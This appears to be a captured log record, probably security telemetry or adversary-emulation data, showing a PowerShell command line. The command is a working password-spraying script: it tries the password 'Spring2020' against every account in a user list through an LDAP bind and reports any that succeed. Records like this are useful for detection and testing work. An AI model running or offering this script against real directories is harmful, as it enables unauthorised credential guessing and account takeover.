Data.#text: whoami - displays logged on user information

"powershell.exe" & {function Invoke-dpsLight ($Password, $userlist) {, $users = Get-Content $userlist, $Domain = \""LDAP://\"" + ([ADSI]\""\"").distinguishedName, foreach ($User in $users) {,   $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password),   if ($Domain_check.name -ne $null) {,     Write-Host -ForegroundColor Green \""Password found for User:$User Password:$Password\"",   },   else { Write-Host \"". \"" -NoNewline}, }, Write-Host -ForegroundColor green \""Finished\"", }, Invoke-dpsLight \""Spring2020\"" $env:Temp\usersdpsLight.txt}
